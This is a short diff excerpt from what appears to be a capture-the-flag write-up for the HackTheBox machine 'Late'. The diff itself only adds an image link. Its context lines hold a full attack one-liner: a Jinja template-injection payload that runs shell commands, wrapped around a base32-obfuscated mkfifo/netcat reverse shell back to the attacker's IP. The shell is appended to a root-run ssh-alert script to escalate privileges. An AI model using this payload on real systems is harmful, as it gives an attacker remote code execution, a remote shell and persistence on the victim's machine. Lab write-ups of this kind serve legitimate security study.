@@ -116,7 +116,7 @@ export _IP_=$(ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f
 export _PORT_=9000
 curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'echo "echo $(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc '$_IP_ $_PORT_' >/tmp/f" | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax
 ```
-
+![](./ocr2.gif)
 
 # OCR one script (unstable)
 
